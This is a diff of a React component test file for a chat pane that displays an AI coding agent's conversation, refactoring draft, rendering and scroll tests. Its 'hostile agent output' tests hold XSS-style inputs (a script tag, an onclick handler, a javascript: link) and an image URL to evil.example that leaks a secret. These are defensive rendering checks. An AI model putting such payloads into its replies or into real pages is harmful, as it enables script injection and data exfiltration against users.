@@ -1,28 +1,10 @@
-// @vitest-environment jsdom
 import { describe, it, expect, afterEach, beforeAll, beforeEach, vi } from 'vitest'
 import { render, screen, cleanup, waitFor, fireEvent, within, act } from '@testing-library/react'
 import { QueryClientProvider, type QueryClient } from '@tanstack/react-query'
-import type { ReactNode } from 'react'
+import type { JSX, ReactNode } from 'react'
 import type { AcpClientMessage, AcpDiff, AcpEvent, AcpEventInit, AcpQueuedPrompt, AcpToolCall } from '@yaac/shared/acp'
 import type { PermissionMode, WorkspaceFiles } from '@yaac/shared/types'
 
-/**
- * jsdom has no ResizeObserver; the pane uses one to follow the tail when it
- * shrinks. This fake can be fired so the scroll-follow tests can simulate a
- * soft keyboard opening.
- */
-const paneResized = new Set<() => void>()
-beforeAll(() => {
-  globalThis.ResizeObserver ??= class {
-    private readonly fire: () => void
-    constructor(cb: ResizeObserverCallback) {
-      this.fire = () => cb([], this)
-    }
-    observe(): void { paneResized.add(this.fire) }
-    unobserve(): void { paneResized.delete(this.fire) }
-    disconnect(): void { paneResized.delete(this.fire) }
-  }
-})
 
 /**
  * Draft persistence across unmounts (workspace stopped, tab closed, reload).
@@ -49,13 +31,10 @@ vi.mock('#lib/useSnapshot', () => ({ useSnapshot: () => snapshot() }))
 
 import { WorkspaceChat } from '#components/WorkspaceChat'
 import { chatDraftKey, flushChatDrafts, useUiStore } from '#lib/store'
-import { countMatches, type QuerySpec } from '#lib/matchCount'
 import { IS_MAC } from '#lib/platform'
 import { filesKey } from '#lib/useWorkspaceChanges'
-import { testQueryClient } from './harness'
-
-const user = (seq: number, text: string): AcpEvent =>
-  ({ type: 'user', seq, content: [{ type: 'text', text }] })
+import { agentEvent as agent, testQueryClient, userEvent as user } from './harness'
+import { resizeAll } from './setup'
 
 function box(): HTMLTextAreaElement {
   return screen.getByRole('textbox')
@@ -63,6 +42,11 @@ function box(): HTMLTextAreaElement {
 
 function type(text: string): void {
   fireEvent.change(box(), { target: { value: text } })
+}
+
+/** The text of each element `selector` matches. */
+function textsOf(container: HTMLElement, selector: string): Array<string | null> {
+  return [...container.querySelectorAll(selector)].map((el) => el.textContent)
 }
 
 /* Most cases assert on every step, so they start from the full view. */
@@ -74,24 +58,22 @@ beforeEach(() => {
  *  listing a test seeds. */
 let client: QueryClient
 
-function show(workspaceId = 'w1', agentSessionId = 'acp-1', focused?: boolean): ReturnType<typeof render> {
+/** The pane on screen, and the one the user is in unless `focused` is false. */
+const pane = (workspaceId = 'w1', agentSessionId = 'acp-1', focused = true): JSX.Element =>
+  <WorkspaceChat workspaceId={workspaceId} agentSessionId={agentSessionId} visible focused={focused} />
+
+function show(workspaceId?: string, agentSessionId?: string, focused?: boolean): ReturnType<typeof render> {
   client = testQueryClient()
   const wrapper = ({ children }: { children: ReactNode }): ReactNode =>
     <QueryClientProvider client={client}>{children}</QueryClientProvider>
-  return render(
-    <WorkspaceChat
-      workspaceId={workspaceId}
-      agentSessionId={agentSessionId}
-      {...(focused !== undefined ? { focused } : {})}
-    />,
-    { wrapper },
-  )
+  return render(pane(workspaceId, agentSessionId, focused), { wrapper })
 }
 
 describe('WorkspaceChat drafts', () => {
   beforeEach(() => {
     stream.events = []
     stream.busy = false
+    stream.queued = []
     stream.connected = true
     stream.send.mockClear()
     useUiStore.setState({ chatDrafts: {} })
@@ -142,60 +124,44 @@ describe('WorkspaceChat drafts', () => {
 
     // The echo confirms delivery and empties the box.
     stream.events = [user(0, 'ship it')]
-    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
+    rerender(pane())
     await waitFor(() => expect(box().value).toBe(''))
     expect(useUiStore.getState().chatDrafts).toEqual({})
   })
 
-  it('drops a restored draft the conversation shows was delivered', async () => {
-    // Sent, then navigated away before the echo. The message did arrive, so
-    // the replayed history wins over the saved draft.
-    useUiStore.getState().setChatDraft('w1', 'acp-1', 'already sent')
-    useUiStore.getState().setChatSent('w1', 'acp-1', 'already sent')
-    stream.events = [user(0, 'already sent')]
-    show()
-    await waitFor(() => expect(box().value).toBe(''))
-    expect(useUiStore.getState().chatDrafts).toEqual({})
-  })
-
-  it('keeps a restored draft the conversation never received', async () => {
-    // The socket dropped before the prompt got through, so the history ends
-    // with something else and the text stays.
-    useUiStore.getState().setChatDraft('w1', 'acp-1', 'never made it')
-    useUiStore.getState().setChatSent('w1', 'acp-1', 'never made it')
-    stream.events = [user(0, 'an earlier message')]
-    show()
-    await waitFor(() => expect(box().value).toBe('never made it'))
-  })
-
-  it('keeps typed-but-unsent text that repeats what was already said', async () => {
+  /**
+   * A draft restored on mount, as an earlier mount left it: `sent` was in
+   * flight, and the box then held `draft`. The box clears only if it still
+   * holds what was in flight and the replayed history or the server's queue
+   * shows it arrived.
+   */
+  it.each<[string, { draft: string; sent?: string; events: AcpEvent[]; queued?: AcpQueuedPrompt[]; connected?: boolean }, string]>([
+    // Sent, then navigated away before the echo; the history wins.
+    ['drops one the conversation shows was delivered',
+      { draft: 'already sent', sent: 'already sent', events: [user(0, 'already sent')] }, ''],
+    ['drops one the server is holding in its queue',
+      { draft: 'queued', sent: 'queued', events: [], queued: [{ id: 'q1', text: 'queued', images: 0 }] }, ''],
+    // The socket dropped before the prompt got through.
+    ['keeps one the conversation never received',
+      { draft: 'never made it', sent: 'never made it', events: [user(0, 'an earlier message')] }, 'never made it'],
     // Why the `sent` marker exists: short replies repeat. "ok" was sent and
-    // answered; the user types "ok" again and leaves before sending. Nothing
-    // was in flight, so the history says nothing about this text.
-    useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok')
-    stream.events = [user(0, 'ok'), { type: 'agent', seq: 1, content: [{ type: 'text', text: 'done' }] }]
+    // answered, then typed again and left unsent.
+    ['keeps typed-but-unsent text that repeats what was already said',
+      { draft: 'ok', events: [user(0, 'ok'), agent(1, 'done')] }, 'ok'],
+    // The message arrived, but editing the box since made it new work.
+    ['keeps an edited one even when the original send was delivered',
+      { draft: 'ok, and one more thing', sent: 'ok', events: [user(0, 'ok')] }, 'ok, and one more thing'],
+    // Nothing to compare against until the replay lands.
+    ['keeps one while the pane is still connecting', { draft: 'unsent', events: [], connected: false }, 'unsent'],
+  ])('%s', async (_, { draft, sent, events, queued = [], connected = true }, expected) => {
+    const store = useUiStore.getState()
+    store.setChatDraft('w1', 'acp-1', sent ?? draft)
+    if (sent !== undefined) store.setChatSent('w1', 'acp-1', sent)
+    store.setChatDraft('w1', 'acp-1', draft)
+    Object.assign(stream, { events, queued, connected })
     show()
-    await waitFor(() => expect(box().value).toBe('ok'))
-  })
-
-  it('keeps an edited draft even when the original send was delivered', async () => {
-    // The message arrived, but the box has been edited since, so its content
-    // is new work.
-    useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok')
-    useUiStore.getState().setChatSent('w1', 'acp-1', 'ok')
-    useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok, and one more thing')
-    stream.events = [user(0, 'ok')]
-    show()
-    await waitFor(() => expect(box().value).toBe('ok, and one more thing'))
-  })
-
-  it('keeps a restored draft while the pane is still connecting', async () => {
-    // There is nothing to compare against until the replay lands, so the
-    // text is kept.
-    stream.connected = false
-    useUiStore.getState().setChatDraft('w1', 'acp-1', 'unsent')
-    show()
-    await waitFor(() => expect(box().value).toBe('unsent'))
+    await waitFor(() => expect(box().value).toBe(expected))
+    expect(useUiStore.getState().chatDrafts[chatDraftKey('w1', 'acp-1')]).toEqual(expected === '' ? undefined : { text: expected })
   })
 })
 
@@ -235,7 +201,7 @@ describe('WorkspaceChat mid-turn', () => {
     // and clears the box.
     expect(screen.queryByText('sent mid-turn')).toBeNull()
     stream.events = [...stream.events, { type: 'user', seq: 1, content: [{ type: 'text', text: 'use the staging config' }], steered: true }]
-    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
+    rerender(pane())
     await waitFor(() => expect(box().value).toBe(''))
     expect(screen.getAllByText('sent mid-turn')).toHaveLength(1)
     expect(screen.getByText('use the staging config')).toBeTruthy()
@@ -248,20 +214,12 @@ describe('WorkspaceChat mid-turn', () => {
 
     // Queued, not echoed: the box is free for the next message.
     stream.queued = [{ id: 'q1', text: 'then write the docs', images: 0 }]
-    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
+    rerender(pane())
     await waitFor(() => expect(box().value).toBe(''))
     expect(screen.getByText('then write the docs')).toBeTruthy()
 
     fireEvent.click(screen.getByRole('button', { name: 'Remove queued message' }))
     expect(stream.send).toHaveBeenLastCalledWith({ type: 'unqueue', id: 'q1' })
-  })
-
-  it('drops a restored draft the server is holding in its queue', async () => {
-    useUiStore.getState().setChatDraft('w1', 'acp-1', 'queued before reload')
-    useUiStore.getState().setChatSent('w1', 'acp-1', 'queued before reload')
-    stream.queued = [{ id: 'q1', text: 'queued before reload', images: 0 }]
-    show()
-    await waitFor(() => expect(box().value).toBe(''))
   })
 })
 
@@ -380,8 +338,6 @@ describe('WorkspaceChat context meter', () => {
 })
 
 describe('WorkspaceChat condensed view', () => {
-  const agent = (seq: number, text: string): AcpEvent =>
-    ({ type: 'agent', seq, content: [{ type: 'text', text }] })
   const tool = (seq: number, title: string, status: AcpToolCall['status'] = 'completed'): AcpEvent =>
     ({ type: 'tool', seq, call: { toolCallId: title, title, kind: 'other', status } })
 
@@ -403,7 +359,6 @@ describe('WorkspaceChat condensed view', () => {
     useUiStore.setState({ chatDrafts: {}, chatCondensed: true })
   })
 
-  afterEach(cleanup)
 
   it('folds all but the prompts, each turn’s last message and the live activity, and remembers the choice', () => {
     show()
@@ -470,24 +425,14 @@ describe('WorkspaceChat condensed view', () => {
 })
 
 describe('WorkspaceChat find', () => {
-  /** jsdom has no Worker; this one counts on the main thread a tick later. */
-  class FakeWorker {
-    onmessage: ((e: MessageEvent) => void) | null = null
-    postMessage(msg: { id: number; doc: string; spec: QuerySpec }): void {
-      setTimeout(() => this.onmessage?.({ data: { id: msg.id, matches: countMatches(msg.doc, msg.spec) } } as MessageEvent), 0)
-    }
-    terminate(): void {}
-  }
-
   beforeEach(() => {
     vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
-    vi.stubGlobal('Worker', FakeWorker)
     Range.prototype.getBoundingClientRect = () => new DOMRect()
     stream.events = [
       user(0, 'first ask'),
       { type: 'thought', seq: 1, content: [{ type: 'text', text: 'the needle is here' }] },
       { type: 'tool', seq: 2, call: { toolCallId: 't', title: 'ls', kind: 'other', status: 'completed' } },
-      { type: 'agent', seq: 3, content: [{ type: 'text', text: 'done' }] },
+      agent(3, 'done'),
     ]
     stream.busy = false
     useUiStore.setState({ chatDrafts: {}, chatCondensed: true })
@@ -495,7 +440,6 @@ describe('WorkspaceChat find', () => {
 
   afterEach(() => {
     cleanup()
-    vi.unstubAllGlobals()
     vi.useRealTimers()
   })
 
@@ -512,7 +456,7 @@ describe('WorkspaceChat find', () => {
     pressFind()
     expect(screen.queryByRole('textbox', { name: 'Find' })).toBeNull()
 
-    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" focused />)
+    rerender(pane())
     pressFind()
     expect(document.activeElement).toBe(find())
     expect(screen.queryByText('the needle is here')).toBeNull()
@@ -572,7 +516,7 @@ describe('WorkspaceChat images', () => {
     // The echo draws the image in the conversation, and the composer clears
     // both the text and the image.
     stream.events = [{ type: 'user', seq: 0, content: [{ type: 'text', text: 'what is this?' }, image] }]
-    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
+    rerender(pane())
     await waitFor(() => expect(box().value).toBe(''))
     expect(container.querySelectorAll('img')).toHaveLength(1)
     expect(screen.queryByLabelText('Remove image')).toBeNull()
@@ -801,8 +745,6 @@ describe('WorkspaceChat composer menu', () => {
  * output, file reads as code, and edits as diffs that start expanded.
  */
 describe('WorkspaceChat rendering', () => {
-  const agent = (seq: number, text: string): AcpEvent =>
-    ({ type: 'agent', seq, content: [{ type: 'text', text }] })
 
   const toolCall = (seq: number, call: Partial<AcpToolCall> & { toolCallId: string }): AcpEvent => ({
     type: 'tool',
@@ -838,30 +780,18 @@ describe('WorkspaceChat rendering', () => {
     expect(screen.getByText('hello')).toBeTruthy()
   })
 
-  it('renders the agent’s markdown as a document', () => {
-    stream.events = [agent(0, '## Heading\n\nSome **bold** and `code`.\n\n- one\n- two\n')]
-    const { container } = show()
-    expect(container.querySelector('h2')?.textContent).toBe('Heading')
-    expect(container.querySelector('strong')?.textContent).toBe('bold')
-    expect(container.querySelector('code')?.textContent).toBe('code')
-    expect(container.querySelectorAll('li')).toHaveLength(2)
-  })
-
-  it('renders a fenced block as highlighted code, without its backticks', () => {
-    stream.events = [agent(0, 'run it:\n\n```ts\nconst x = 1\n```\n')]
-    const { container } = show()
-    const block = container.querySelector('pre code')
-    expect(block?.textContent).toBe('const x = 1')
-    expect(container.textContent).not.toContain('```')
+  it.each<[string, string, Record<string, string[]>]>([
+    ['as a document', '## Heading\n\nSome **bold** and `code`.\n\n- one\n- two\n',
+      { h2: ['Heading'], strong: ['bold'], code: ['code'], li: ['one', 'two'] }],
     // Tokenized with the same classes the diff views use.
-    expect(block?.querySelector('.tok-keyword')?.textContent).toBe('const')
-  })
-
-  it('renders a GFM table', () => {
-    stream.events = [agent(0, '| a | b |\n| --- | --- |\n| 1 | 2 |\n')]
+    ['a fenced block as highlighted code', 'run it:\n\n```ts\nconst x = 1\n```\n',
+      { 'pre code': ['const x = 1'], '.tok-keyword': ['const'] }],
+    ['a GFM table', '| a | b |\n| --- | --- |\n| 1 | 2 |\n', { th: ['a', 'b'], td: ['1', '2'] }],
+  ])('renders the agent’s markdown: %s', (_, markdown, found) => {
+    stream.events = [agent(0, markdown)]
     const { container } = show()
-    expect(container.querySelectorAll('th')).toHaveLength(2)
-    expect(container.querySelectorAll('td')).toHaveLength(2)
+    for (const [selector, texts] of Object.entries(found)) expect(textsOf(container, selector)).toEqual(texts)
+    expect(container.textContent).not.toContain('```')
   })
 
   it('marks a call running until it finishes, and interrupted if its turn ends first', () => {
@@ -881,7 +811,7 @@ describe('WorkspaceChat rendering', () => {
 
     stream.events = [...stream.events, { type: 'turn-end', seq: 2, stopReason: 'cancelled' }]
     stream.busy = false
-    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
+    rerender(pane())
     expect(screen.queryByLabelText('running')).toBeNull()
     expect(sleepRow()?.querySelector('svg.lucide-square-terminal')).toBeTruthy()
     expect(sleepRow()?.textContent).toContain('interrupted')
@@ -972,7 +902,7 @@ describe('WorkspaceChat rendering', () => {
       kind: 'edit',
       content: [{ type: 'diff', path: '/workspace/a.ts', oldText: 'x', newText: 'y' }],
     })]
-    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
+    rerender(pane())
     expect(container.querySelector('.diff-hl')).toBeTruthy()
   })
 
@@ -1029,21 +959,30 @@ describe('WorkspaceChat rendering', () => {
     }
   })
 
-  it('shows a read as the file, highlighted for its path', () => {
+  /** `#` is a line of the file, not a heading, and the code is tokenized
+   *  like the diff views. */
+  it.each<[string, string | undefined, string, string, string | undefined]>([
+    ['as the file, highlighted for its path', '/workspace/a.ts', '# not a heading\nconst x = 1\n', '# not a heading', 'const'],
+    // Without a path it can't be highlighted, but it is still not markdown.
+    ['that named no file as code anyway', undefined, '## not a heading\n', '## not a heading', undefined],
+    // Unwrapping a lone fence assumes the backticks are an adapter's
+    // wrapper. For a `.md` that is often wrong: a document whose body is one
+    // code sample would lose real characters.
+    ['of a markdown file with its own fences', '/workspace/notes.md', '```ts\nconst x = 1\n```\n', '```ts', undefined],
+    ['without a path in the language its fence names', undefined, '```python\nimport os\n```\n', 'import os', 'import'],
+  ])('shows a read %s', (_, path, text, shows, keyword) => {
     stream.events = [toolCall(0, {
       toolCallId: 't1',
-      title: 'Read a.ts',
+      title: 'Read it',
       kind: 'read',
-      locations: [{ path: '/workspace/a.ts' }],
-      content: [{ type: 'text', text: '# not a heading\nconst x = 1\n' }],
+      ...(path !== undefined ? { locations: [{ path }] } : {}),
+      content: [{ type: 'text', text }],
     })]
     const { container } = show()
-    fireEvent.click(screen.getByText('Read a.ts'))
-    // Rendered as source: `#` is a line of the file, not a heading, and the
-    // code is tokenized like the diff views.
-    expect(container.querySelector('h1')).toBeNull()
-    expect(container.querySelector('.diff-hl')?.textContent).toContain('# not a heading')
-    expect(container.querySelector('.tok-keyword')?.textContent).toBe('const')
+    fireEvent.click(screen.getByText('Read it'))
+    expect(container.querySelector('h1, h2')).toBeNull()
+    expect(container.querySelector('.diff-hl')?.textContent).toContain(shows)
+    expect(container.querySelector('.tok-keyword')?.textContent).toBe(keyword)
   })
 
   it('lifts a read’s line numbers into a gutter, out of the code', () => {
@@ -1066,49 +1005,6 @@ describe('WorkspaceChat rendering', () => {
     expect(block?.textContent).not.toContain('→')
     // Nor are the adapter's backticks part of the file.
     expect(container.textContent).not.toContain('```')
-  })
-
-  it('shows a read that named no file as code anyway', () => {
-    // A read's body is file text even when the adapter names no file. Without
-    // a path it can't be highlighted, but it is still not markdown.
-    stream.events = [toolCall(0, {
-      toolCallId: 't1',
-      title: 'Read something',
-      kind: 'read',
-      content: [{ type: 'text', text: '## not a heading\n' }],
-    })]
-    const { container } = show()
-    fireEvent.click(screen.getByText('Read something'))
-    expect(container.querySelector('h2')).toBeNull()
-    expect(screen.getByText('## not a heading')).toBeTruthy()
-  })
-
-  it('keeps a markdown file’s own fences', () => {
-    // Unwrapping a lone fence assumes the backticks are an adapter's wrapper.
-    // For a `.md` that is often wrong: a document whose body is one code
-    // sample would lose real characters.
-    stream.events = [toolCall(0, {
-      toolCallId: 't1',
-      title: 'Read notes.md',
-      kind: 'read',
-      locations: [{ path: '/workspace/notes.md' }],
-      content: [{ type: 'text', text: '```ts\nconst x = 1\n```\n' }],
-    })]
-    const { container } = show()
-    fireEvent.click(screen.getByText('Read notes.md'))
-    expect(container.querySelector('.diff-hl')?.textContent).toContain('```ts')
-  })
-
-  it('takes a read’s language from the fence when it has no path', () => {
-    stream.events = [toolCall(0, {
-      toolCallId: 't1',
-      title: 'Read it',
-      kind: 'read',
-      content: [{ type: 'text', text: '```python\nimport os\n```\n' }],
-    })]
-    const { container } = show()
-    fireEvent.click(screen.getByText('Read it'))
-    expect(container.querySelector('.tok-keyword')?.textContent).toBe('import')
   })
 
   it('names each file when one call edits several', () => {
@@ -1134,8 +1030,6 @@ describe('WorkspaceChat rendering', () => {
  * remove silently. These tests make such a change fail.
  */
 describe('WorkspaceChat with hostile agent output', () => {
-  const agent = (seq: number, text: string): AcpEvent =>
-    ({ type: 'agent', seq, content: [{ type: 'text', text }] })
 
   beforeEach(() => {
     stream.events = []
@@ -1149,31 +1043,20 @@ describe('WorkspaceChat with hostile agent output', () => {
     flushChatDrafts()
   })
 
-  it('leaves raw HTML in a reply inert', () => {
-    stream.events = [agent(0, 'look:\n\n<script>window.pwned = 1</script>\n\n<b onclick="x()">hi</b>\n')]
-    const { container } = show()
-    expect(container.querySelector('script')).toBeNull()
-    expect(container.querySelector('b')).toBeNull()
-    expect(container.querySelector('[onclick]')).toBeNull()
+  it.each<[string, string, Record<string, string[]>, string]>([
     // Not dropped either: it is shown as text.
-    expect(container.textContent).toContain('<script>')
-  })
-
-  it('neutralizes a javascript: link', () => {
-    stream.events = [agent(0, '[click](javascript:alert(1))\n')]
+    ['leaves raw HTML in a reply inert', 'look:\n\n<script>window.pwned = 1</script>\n\n<b onclick="x()">hi</b>\n',
+      { script: [], b: [], '[onclick]': [] }, '<script>'],
+    ['neutralizes a javascript: link', '[click](javascript:alert(1))\n', { a: ['click'], '[href*="javascript:"]': [] }, 'click'],
+    // An `<img src>` makes a request on render with no click, which could
+    // leak whatever the URL encodes.
+    ['shows a remote image as a link instead of fetching it', '![a caption](https://evil.example/pixel?leak=secret)\n',
+      { img: [] }, 'a caption'],
+  ])('%s', (_, markdown, found, shown) => {
+    stream.events = [agent(0, markdown)]
     const { container } = show()
-    const link = container.querySelector('a')
-    expect(link?.textContent).toBe('click')
-    expect(link?.getAttribute('href') ?? '').not.toContain('javascript:')
-  })
-
-  it('shows a remote image as a link instead of fetching it', () => {
-    // An `<img src>` makes a request on render with no click, which could leak
-    // whatever the URL encodes.
-    stream.events = [agent(0, '![a caption](https://evil.example/pixel?leak=secret)\n')]
-    const { container } = show()
-    expect(container.querySelector('img')).toBeNull()
-    expect(screen.getByText('a caption')).toBeTruthy()
+    for (const [selector, texts] of Object.entries(found)) expect(textsOf(container, selector)).toEqual(texts)
+    expect(container.textContent).toContain(shown)
   })
 
   it('keeps tool output that breaks out of its fence inside the same sandbox', () => {
@@ -1359,7 +1242,6 @@ describe('WorkspaceChat scroll follow', () => {
   afterEach(() => {
     cleanup()
     flushChatDrafts()
-    paneResized.clear()
   })
 
   /** jsdom does no layout, so the scroller's metrics are set by hand. The
@@ -1382,7 +1264,7 @@ describe('WorkspaceChat scroll follow', () => {
     // The keyboard shrank the pane from 400px to 200px, pushing the bottom of
     // the conversation out of view.
     const top = scroller(container, 200, 600)
-    for (const fire of paneResized) fire()
+    resizeAll()
     expect(top()).toBe(1000)
   })
 
@@ -1393,7 +1275,7 @@ describe('WorkspaceChat scroll follow', () => {
     // The reader scrolled up to an earlier tool call; the keyboard must not
     // jump them to the bottom.
     fireEvent.scroll(list)
-    for (const fire of paneResized) fire()
+    resizeAll()
     expect(top()).toBe(0)
   })
 })
@@ -1441,8 +1323,6 @@ describe('WorkspaceChat focus', () => {
 })
 
 describe('WorkspaceChat subagents and background tasks', () => {
-  const agent = (seq: number, text: string, thread?: string): AcpEvent =>
-    ({ type: 'agent', seq, ...(thread !== undefined ? { thread } : {}), content: [{ type: 'text', text }] })
   const subagent = (seq: number, state: 'running' | 'completed'): AcpEvent => ({
     type: 'subagent', seq, subagent: { id: 'sub-1', name: 'Explore', task: 'find the router', state },
   })
@@ -1735,7 +1615,7 @@ describe('WorkspaceChat subagents and background tasks', () => {
 
     // Once the task is over, a call never reported finished reads as before.
     stream.events = [...stream.events, task(3, 'stopped')]
-    rerender(<WorkspaceChat workspaceId="w1" agentSessionId="acp-1" />)
+    rerender(pane())
     expect(screen.getByText('interrupted')).toBeTruthy()
   })
 
